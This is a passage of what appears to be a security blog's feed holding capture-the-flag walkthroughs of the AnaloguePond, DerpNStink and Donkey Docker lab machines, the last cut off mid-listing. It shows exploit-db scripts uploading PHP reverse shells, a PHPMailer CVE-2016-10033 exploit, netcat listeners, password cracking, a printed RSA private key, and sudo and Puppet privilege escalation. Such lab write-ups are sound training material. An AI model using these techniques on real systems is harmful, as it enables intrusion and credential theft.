<p> System information disabled due to load higher than 1.0</p>

<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>nleeson@barringsbank:~$
```</p>

<h2>Rooting barringsbank</h2>

<p>Inside nleeson&rsquo;s home there&rsquo;s nothing interesting. I found another reticulatingsplines picture like in eric&rsquo;s home. There wasn&rsquo;t anything exploitable around, but we know that Puppet is pushing configuration changes from the puppet VM. With my root privileges in that VM, I edited the <strong>nodes.pp</strong> and <strong>site.pp</strong> files in <code>/etc/puppet/manifests</code> to include the wiggle module on barringsbank as well:</p>

<p><code>
node 'barringsbank.example.com' inherits 'default' {
  include wiggle
  }
</code></p>

<p>If you&rsquo;re wondering how long you have to wait for Puppet changes to propagate over the nodes, there&rsquo;s a cron job that runs every 10 minutes:</p>

<p>```</p>

<h1>Puppet Name: puppet check in</h1>

<p>*/10 * * * * /usr/bin/puppet agent &mdash;test > /dev/null 2>&amp;1
```</p>

<p>Nothing&rsquo;s stopping us from running the agent though. Whichever way you choose, the spin binary will now appear in /tmp on barringsbank, and that&rsquo;s another root:</p>

<p>Inside /root there&rsquo;s an image owned by nleeson that I transferred all the way back to my machine:</p>

<p><code>
-rw-rw-r--  1 nleeson nleeson 215K Dec 21  2016 me.jpeg
</code></p>

<p><img class="center" src="/images/pentest/analoguepond/me.jpeg" title="&lsquo;final flag&rsquo; &lsquo;final flag&rsquo;" ></p>

<h2>Final flag</h2>

<p>Checking for embedded data on the image, we&rsquo;re being asked for a passphrase. I&rsquo;ve used all the hints, tried extrabacon as well..but remember the 2 cow pictures called reticulatingsplines found on 2 separate machines. Trying that as the passphrase worked:</p>

<p>```
steghide info me.jpeg
&ldquo;me.jpeg&rdquo;:
  format: jpeg
  capacity: 11.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file &ldquo;primate_egyptian_flag.txt&rdquo;:</p>

<pre><code>size: 3.7 KB
encrypted: rijndael-128, cbc
compressed: yes
</code></pre>

<p>```</p>

<p>I then extracted the file:</p>

<p><code>
steghide extract -sf me.jpeg
Enter passphrase:
wrote extracted data to "primate_egyptian_flag.txt".
</code></p>

<p>A big hex string that gets decoded to another reversed Base64 string. I used the CLI to decode the flag:</p>

<p>```
cat primate_egyptian_flag.txt | xxd -p -r | rev | base64 -d</p>

<p>Here&rsquo;s a fender bass for you&hellip;</p>

<pre><code>                              ,-.        _.---._
                            |  `\.__.-''       `.
                             \  _        _  ,.   \
       ,+++=._________________)_||______|_|_||    |
      (_.ooo.===================||======|=|=||    |
         ~~'                 |  ~'      `~' o o  /
                              \   /~`\     o o  /
                               `~'    `-.____.-'
</code></pre>

<p>Congratulations to you once again and for the sixth time on capturing this
flag!</p>

<p>I&rsquo;ve tried to mix things up a bit here, to move away from throw metasploit
and web exploits at things. I hope you have enjoyed that portion and your
feedback on this aspect would be appreciated.</p>

<p>Of note, these VMs are set to do automatic security updates using puppet,
so this ought to keep things dynamic enough for people.</p>

<p>Many thanks to mrB3n, Rand0mByteZ and kevinnz for testing this CTF.</p>

<p>A special thank you to g0tmi1k for hosting all these challenges and the
valuable advice. A tip of the hat to mrb3n for his recent assistance. Hit
me on IRC or twitter if you are looking for a hint or have completed the
challenge.</p>

<p>Go on, Complete the circle: 06:30 to 07:45 of episode #1 of Our Friends In
The North &copy; BBC 1995.. What&rsquo;s the connection&hellip;.?</p>

<pre><code>                                                       --Knightmare
</code></pre>

<p>```</p>

<p>This was another excellent machine by Knightmare! Using puppet for exploitation was a new and exciting way to pwn the box.</p>

<p>```</p>

<hr />

<p>/ Communicate! It can&rsquo;t make things any \</p>

<h2>\ worse.                                /</h2>

<pre><code>   \   ^__^
    \  (oo)\_______
       (__)\       )\/\
           ||----w |
           ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Derpnstink]]></title>
    <link href="http://chousensha.github.io/blog/2019/05/19/derpnstink/"/>
    <updated>2019-05-19T20:36:18+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/05/19/derpnstink</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired from the OSCP labs and it has 4 flags to collect.</p>

<blockquote><p>Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified  professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live&hellip;</p></blockquote>

<!-- more -->


<p><code>
ORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
</code></p>

<p>Not too many ports to play with. No available exploit for the FTP. The web server seems unfinished:</p>

<p><img class="center" src="/images/pentest/derpnstink/derpnstink.png" title="&lsquo;derpnstink&rsquo; &lsquo;derpnstink&rsquo;" ></p>

<p>Let&rsquo;s check the robots.txt entries. The php folder gives a Forbidden error and the temporary one just displays a try harder! message. I ran gobuster on the web server and found a couple more entries. The interesting one was a <em>/weblog</em> folder:</p>

<p><code>
/weblog (Status: 301)
</code></p>

<p>When I hit that in the browser, it gave me a connection error, but for the derpnstink.local domain. So I added that to my /etc/hosts file and then I was able to connect:</p>

<p><img class="center" src="/images/pentest/derpnstink/weblog.png" title="&lsquo;weblog&rsquo; &lsquo;weblog&rsquo;" ></p>

<p>This is a Wordpress site, so I ran a Wordpress scanner on it and the interesting findings were:</p>

<p>```
[!] Title: WordPress 3.7-5.0 (except 4.9.9) &ndash; Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      &ndash; <a href="https://wpvulndb.com/vulnerabilities/9222">https://wpvulndb.com/vulnerabilities/9222</a>
 |      &ndash; <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942</a>
 |      &ndash; <a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</a></p>

<p> [!] Title: Slideshow Gallery &lt; 1.4.7 Arbitrary File Upload
  |     Fixed in: 1.4.7
  |     References:
  |      &ndash; <a href="https://wpvulndb.com/vulnerabilities/7532">https://wpvulndb.com/vulnerabilities/7532</a>
  |      &ndash; <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460</a>
  |      &ndash; <a href="https://www.exploit-db.com/exploits/34681/">https://www.exploit-db.com/exploits/34681/</a>
  |      &ndash; <a href="https://www.exploit-db.com/exploits/34514/">https://www.exploit-db.com/exploits/34514/</a>
  |      &ndash; <a href="http://seclists.org/bugtraq/2014/Sep/1">http://seclists.org/bugtraq/2014/Sep/1</a>
  |      &ndash; <a href="http://packetstormsecurity.com/files/131526/">http://packetstormsecurity.com/files/131526/</a>
  |      &ndash; <a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload">https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload</a>
```</p>

<p>It seems not much can be done without authentication, so I went to wp-admin and enumerated the username <em>admin</em> as a valid user&hellip;and in the process also discovered that the password is <em>admin</em>..derp! Now I could use an <a href="https://www.exploit-db.com/exploits/34681">exploit for the authenticated arbitrary file upload</a> with <code>python gallery.py -t <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> -f ~/Desktop/php-reverse-shell.php -u admin -p admin</code>, and you can find the uploaded shell at <a href="http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php">http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php</a></p>

<p>From your new shell, if you look inside <code>/var/www/html/weblog/wp-config.php</code>, you can find the MySQL credentials:</p>

<p>```
/<em>* The name of the database for WordPress </em>/
define(&lsquo;DB_NAME&rsquo;, &lsquo;wordpress&rsquo;);</p>

<p>/<em>* MySQL database username </em>/
define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);</p>

<p>/<em>* MySQL database password </em>/
define(&lsquo;DB_PASSWORD&rsquo;, &lsquo;mysql&rsquo;);</p>

<p>/<em>* MySQL hostname </em>/
define(&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
```</p>

<p>Inside <code>/var/www/html/php/info.php</code> there is a line stating that there&rsquo;s a PHPMyAdmin interface:</p>

<p><code>
/* management interface can be found at /phpmyadmin
</code></p>

<p>I went to <a href="http://derpnstink.local/php/phpmyadmin/">http://derpnstink.local/php/phpmyadmin/</a> and used the credentials to get in the wordpress database and get 2 users and hashes:</p>

<p><img class="center" src="/images/pentest/derpnstink/users.png" title="&lsquo;users&rsquo; &lsquo;users&rsquo;" ></p>

<p>We already know the admin credentials, so I used john and the rockyou.txt wordlist to crack the hash and get the password <em>wedgie57</em> for user <em>unclestinky</em>. My first move was to try SSH'ing in, but public key authentication was configured. That left the FTP, and I was able to log in with the credentials <em>stinky</em>:<em>wedgie57</em> (there was no unclestinky user configured on the system)</p>

<p>On the FTP, we find a folder with some files that I downloaded on my machine for a better look: <code>wget -r <a href="ftp://derpnstink.local/files">ftp://derpnstink.local/files</a> &mdash;ftp-user=stinky &mdash;ftp-password=wedgie57</code></p>

<p><code>
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    5 1001     1001         4096 Nov 12  2017 files
226 Directory send OK.
ftp&gt; ls files
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Nov 12  2017 network-logs
drwxr-xr-x    3 1001     1001         4096 Nov 12  2017 ssh
-rwxr-xr-x    1 0        0              17 Nov 12  2017 test.txt
drwxr-xr-x    2 0        0            4096 Nov 12  2017 tmp
</code></p>

<p>Inside network-logs there&rsquo;s a file that hints at some PCAP analysis:</p>

<p><code>
cat derpissues.txt
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
</code></p>

<p>Inside <em>/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh</em> there&rsquo;s a private key:</p>

<p><code>
cat key.txt
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----
</code></p>

<p>Now we can SSH on the box:</p>

<p>```
ssh -i stinky_key <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x73;&#x74;&#105;&#x6e;&#x6b;&#121;&#x40;&#x64;&#101;&#x72;&#x70;&#110;&#x73;&#x74;&#x69;&#110;&#107;&#46;&#108;&#x6f;&#x63;&#97;&#x6c;">&#115;&#116;&#x69;&#x6e;&#x6b;&#x79;&#64;&#x64;&#101;&#114;&#112;&#x6e;&#x73;&#116;&#x69;&#110;&#107;&#46;&#108;&#111;&#x63;&#x61;&#108;</a>
Ubuntu 14.04.5 LTS</p>

<pre><code>                   ,~~~~~~~~~~~~~..
                   '  Derrrrrp  N  `
    ,~~~~~~,       |    Stink      |
   / ,      \      ',  ________ _,"
  /,~|_______\.      \/
 /~ (__________)
(*)  ; (^)(^)':
    =;  ____  ;
      ; """"  ;=
</code></pre>

<p>   {&ldquo;}<em>   &lsquo; &rsquo;&rdquo;&ldquo;&lsquo; &rsquo; </em>{&rdquo;}
   _<em>/     >  &lt;   _</em>/</p>

<pre><code>  \    ,"   ",  /
   \  "       /"
      "      "=
       &gt;     &lt;
      ="     "-
      -`.   ,'
            -
        `--'
</code></pre>

<p>Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>331 packages can be updated.
231 updates are security updates.</p>

<p>Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129
stinky@DeRPnStiNK:~$
```</p>

<p>Inside Documents there&rsquo;s the derpissues.pcap file. I ran <code>strings derpissues.pcap | grep pass</code> on it to get another set of credentials:</p>

<p><code>
user_login=mrderp
pass1=derpderpderpderpderpderpderp
</code></p>

<p>In the /etc/passwd file we can find a mrderp user, so I tried to SSH and got in. On the Desktop, I found a file with a helpdesk ticket about sudo issues:</p>

<p>```
mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
From: Help Desk <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#x68;&#101;&#108;&#112;&#x64;&#x65;&#x73;&#x6b;&#64;&#x64;&#x65;&#114;&#x70;&#110;&#115;&#116;&#x69;&#110;&#107;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;">&#104;&#x65;&#108;&#112;&#x64;&#101;&#x73;&#x6b;&#64;&#x64;&#101;&#x72;&#112;&#110;&#115;&#x74;&#x69;&#110;&#107;&#46;&#x6c;&#111;&#x63;&#x61;&#108;</a>
Date: Thu, Aug 23, 2017 at 1:29 PM
Subject: sudoers ISSUE=242 PROJ=26
To: Derp, Mr (mrderp) [C]
When replying, type your text above this line.</p>

<p>Help Desk Ticket Notification
Thank you for contacting the Help Desk. Your ticket information is below. If you have any
additional information to add to this ticket, please reply to this notification.
If you need immediate help (i.e. you are within two days of a deadline or in the event of a
security emergency), call us. Note that the Help Desk&rsquo;s busiest hours are between 10 a.m. (ET)
and 3 p.m. (ET).</p>

<p>Toll-free: 1-866-504-9552
Phone: 301-402-7469
TTY: 301-451-5939
Ticket Title: Sudoers File issues
Ticket Number: 242
Status: Break/fix
Date Created: 08/23/2017
Latest Update Date: 08/23/2017
Contact Name: Mr Derp
CC’s: Uncle Stinky
Full description and latest notes on your Ticket: Sudoers File issues
Notification</p>

<p>Regards,
Service Desk</p>

<p>Listen with focus, answer with accuracy, assist with compassion.</p>

<p>From: Help Desk
Date: Mon, Sep 10, 2017 at 2:53 PM
Subject: sudoers ISSUE=242 PROJ=26
To: Derp, Mr (mrderp) [C]
When replying, type your text above this line.</p>

<p>Closed Ticket Notification</p>

<p>Thank you for contacting the Help Desk. Your ticket information and its resolution is
below. If you feel that the ticket has not been resolved to your satisfaction or you need additional
assistance, please reply to this notification to provide additional information.
If you need immediate help (i.e. you are within two days of a deadline or in the event of a
security emergency), call us or visit our Self Help Web page at <a href="https://pastebin.com/RzK9WfGw">https://pastebin.com/RzK9WfGw</a>
Note that the Help Desk&rsquo;s busiest hours are between 10 a.m. (ET)
and 3 p.m. (ET).
Toll-free: 1-866-504-9552
Phone: 301-402-7469
TTY: 301-451-5939
Ticket Title: sudoers issues
Ticket Number: 242
Status: Closed
Date Created: 09/10/2017
Latest Update Date: 09/10/2017
CC’s:
Resolution: Closing ticket. ticket notification.</p>

<p>Regards,
eRA Service Desk
Listen with focus, answer with accuracy, assist with compassion.
For more information, dont forget to visit the Self Help Web page!!!
```</p>

<p>On the root filesystem, I found an interesting folder called /support with more information about this sudo issue:</p>

<p>```
mrderp@DeRPnStiNK:~$ cat /support/troubleshooting.txt</p>

<hr />

<p>On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.</p>

<p>However i dont want to specify each command to allow</p>

<p>How can I exclude these commands from password protection to sudo?</p>

<hr />

<hr />

<p>Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket.</p>

<p>Please contact the Client Support team at <a href="https://pastebin.com/RzK9WfGw">https://pastebin.com/RzK9WfGw</a> if you have any further questions or issues.</p>

<p>Thank you for using our product.</p>

<hr />

<p>```</p>

<p>Running a <strong>sudo -l</strong> gives us the sudo commands that mrderp can run:</p>

<p>```
User mrderp may run the following commands on DeRPnStiNK:</p>

<pre><code>(ALL) /home/mrderp/binaries/derpy*
</code></pre>

<p>```</p>

<p>All I had to do at this point was to create a binaries directory, copy the bash executable to something with derpy in the name and run it as sudo:</p>

<p><code>
mrderp@DeRPnStiNK:~/binaries$ cp -p /bin/bash derpy.sh
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
[sudo] password for mrderp:
root@DeRPnStiNK:~/binaries#
</code></p>

<p>Only at the end I realized I should have also collected flags, but I was too lazy to return to that, so leaving only the last flag here:</p>

<p>```
root@DeRPnStiNK:/root# cat Desktop/flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)</p>

<p>Congrats on rooting my first VulnOS!</p>

<p>Hit me up on twitter and let me know your thoughts!</p>

<p>@securekomodo
```</p>

<p>```</p>

<hr />

<p>/ You need more time; and you probably \</p>

<h2>\ always will.                         /</h2>

<pre><code>   \   ^__^
    \  (oo)\_______
       (__)\       )\/\
           ||----w |
           ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Donkey Docker]]></title>
    <link href="http://chousensha.github.io/blog/2019/04/15/donkey-docker/"/>
    <updated>2019-04-15T21:02:36+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/04/15/donkey-docker</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is called DonkeyDocker, so we should expect a Docker component! The level is intermediate to hard.</p>

<!-- more -->


<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries
|_/contact.php /index.php /about.php
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Docker Donkey
</code></p>

<p>Not much to work with, let&rsquo;s hit the web server first. Nothing interesting on the home page and the contact page d, but going to the about page gives an error that something went wrong.</p>

<p>In the HTML source, I found a comment:</p>

<p>``` html</p>

<!-- FIXME!: www-path: /www -->


<p>```</p>

<p>Didn&rsquo;t find such a path with my enumeration. I fired up Gobuster next:</p>

<p><code>
gobuster -u http://192.168.159.132/ -w /usr/share/wordlists/dirb/big.txt -q -t 20
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/about (Status: 200)
/assets (Status: 301)
/contact (Status: 200)
/css (Status: 301)
/dist (Status: 301)
/index (Status: 200)
/mailer (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
</code></p>

<p>Trying those folders gave me 403 errors, so the next thing I did was to enumerate those folders themselves, and got an interesting hit with the /mailer folder:</p>

<p><code>
gobuster -u http://192.168.159.132/mailer -w /usr/share/wordlists/dirb/big.txt -q -t 20
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/LICENSE (Status: 200)
/docs (Status: 301)
/examples (Status: 301)
/extras (Status: 301)
/language (Status: 301)
/test (Status: 301)
</code></p>

<p>Going to /mailer/examples/ reveals a PHPMailer installation. From the Github files, it should also have a VERSION file, so I went to <a href="http://192.168.159.132/mailer/VERSION">http://192.168.159.132/mailer/VERSION</a> and was rewarded with the version number: 5.2.16. I found a Metasploit exploit:</p>

<blockquote><p>PHPMailer versions up to and including 5.2.19 are affected by a
 vulnerability which can be leveraged by an attacker to write a file
 with partially controlled contents to an arbitrary location through
 injection of arguments that are passed to the sendmail binary. This
 module writes a payload to the web root of the webserver before then
 executing it with an HTTP request. The user running PHPMailer must
 have write access to the specified WEB_ROOT directory and successful
 exploitation can take a few minutes.</p></blockquote>

<p>This one didn&rsquo;t work for me, so I found another one with <a href="https://www.exploit-db.com/exploits/40974">searchsploit</a>. To make it work, I had to install requests_toolbelt and delete the banner that was giving an encoding error. Inside the code I changed the IP and port in the payload and added the target URL:</p>

<p><code>python
target = 'http://192.168.159.132/contact'
</code></p>

<p>Per the <a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html">advisory</a>:</p>

<blockquote><p>To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.</p></blockquote>

<p>After finishing the modifications, I ran it:</p>

<p>``` plain
PHPMailer Exploit CVE 2016-10033 &ndash; anarcoder at protonmail.com
Version 1.0 &ndash; github.com/anarcoder &ndash; greetings opsxcq &amp; David Golunski</p>

<p>[+] SeNdiNG eVIl SHeLL To TaRGeT&hellip;.
[+] SPaWNiNG eVIL sHeLL&hellip;.. bOOOOM :D
```</p>

<p>With a listener on, I went to <a href="http://192.168.159.132/backdoor">http://192.168.159.132/backdoor</a> and got a reverse shell:</p>

<p><code>
nc -vnlp 9000
listening on [any] 9000 ...
connect to [192.168.159.129] from (UNKNOWN) [192.168.159.132] 50930
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@12081bd067cc:/www$
</code></p>

<p>From the hostname, we seem to be inside a Docker container. In the root directory I found a script:</p>

<p>```
www-data@12081bd067cc:/www$ cat /main.sh
cat /main.sh</p>

<h1>!/bin/bash</h1>

<h1>change permission</h1>

<p>chown smith:users /home/smith/flag.txt</p>

<h1>Start apache</h1>

<p>source /etc/apache2/envvars
a2enmod rewrite
apachectl -f /etc/apache2/apache2.conf</p>

<p>sleep 3
tail -f /var/log/apache2/*&amp;</p>

<h1>Start our fake smtp server</h1>

<p>python -m smtpd -n -c DebuggingServer localhost:25
```</p>

<p>Interesting, there is a flag available for user smith. I switched to this user and tried the password smith and it worked:</p>

<p>```
smith@12081bd067cc:~$ ls -al
ls -al
total 28
drwx&mdash;&mdash;&mdash; 1 smith users 4096 Mar 26  2017 .
drwxr-xr-x 1 root  root  4096 Mar 26  2017 ..
-rw-r&mdash;r&mdash; 1 smith users  220 Nov  5  2016 .bash_logout
-rw-r&mdash;r&mdash; 1 smith users 3515 Nov  5  2016 .bashrc
-rw-r&mdash;r&mdash; 1 smith users  675 Nov  5  2016 .profile
drwx&mdash;S&mdash;&ndash; 2 smith users 4096 Mar 22  2017 .ssh
-rw-r&mdash;r&mdash; 1 smith users  237 Mar 22  2017 flag.txt
smith@12081bd067cc:~$ cat flag.txt
cat flag.txt
This is not the end, sorry dude. Look deeper!
I know nobody created a user into a docker
container but who cares? ;&ndash;)</p>

<p>But good work!
Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}</p>

<p>PS: I like 1984 written by George ORWELL
```</p>

<p>Inside smith&rsquo;s home we also have a .ssh folder. Inside we have a pair of private-public keys.</p>

<p><code>
-rwx------ 1 smith users  411 Mar 22  2017 id_ed25519
-rwx------ 1 smith users  101 Mar 22  2017 id_ed25519.pub
smith@12081bd067cc:~/.ssh$ cat id_ed25519.pub
cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
</code></p>

<p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>

<p>```
ssh -i id_ed25519 <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#x6f;&#114;&#x77;&#101;&#x6c;&#108;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#49;&#x35;&#x39;&#46;&#49;&#x33;&#x32;">&#111;&#114;&#x77;&#101;&#x6c;&#x6c;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x31;&#53;&#57;&#46;&#x31;&#x33;&#50;</a>
Welcome to</p>

<hr />

<p> |   \ <strong><em> _ _ | |</em></strong><strong> _  <em>|   \ </em></strong>  <strong>| |</strong><strong><em> _ _
 | |) / _ \ &lsquo; \| / / &ndash;</em>) || | |) / _ \/ <em>| / / &ndash;</em>) &rsquo;<em>|
 |</em></strong>/_<strong>/<em>||</em>|___</strong>|_, |<em><strong>/_</strong>/_</em>|<em>____|</em>|</p>

<pre><code>                    |__/
                         Made with &lt;3 v.1.0 - 2017
</code></pre>

<p>This is my first boot2root &ndash; CTF VM. I hope you enjoy it.
if you run into any issue you can find me on Twitter: @dhn_
or feel free to write me a mail to:</p>

<ul>
<li>Email: <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#100;&#x68;&#110;&#64;&#122;&#x65;&#114;&#48;&#x2d;&#x64;&#97;&#121;&#x2e;&#112;&#x77;">&#100;&#x68;&#x6e;&#x40;&#122;&#x65;&#114;&#x30;&#x2d;&#x64;&#x61;&#121;&#x2e;&#112;&#119;</a></li>
<li>GPG key: 0x2641123C</li>
<li>GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C</li>
</ul>


<p>Level:       I think the level of this boot2root challange</p>

<pre><code>         is hard or intermediate.
</code></pre>

<p>Try harder!: If you are confused or frustrated don&rsquo;t forget</p>

<pre><code>         that enumeration is the key!
</code></pre>

<p>Thanks:      Special thanks to @1nternaut for the awesome</p>

<pre><code>         CTF VM name!
</code></pre>

<p>Feedback:    This is my first boot2root &ndash; CTF VM, please</p>

<pre><code>         give me feedback on how to improve!
</code></pre>

<p>Looking forward to the write-ups!</p>

<p>donkeydocker:~$
```</p>

<p>It worked! In orwell&rsquo;s home we find another flag:</p>

<p>```
donkeydocker:~$ ls -al /home/orwell
total 24
drwxr-sr-x    3 orwell   orwell        4096 Mar 26  2017 .
drwxr-xr-x    3 root     root          4096 Mar 22  2017 ..
-rw-r&mdash;r&mdash;    1 root     orwell           1 Mar 26  2017 .ash
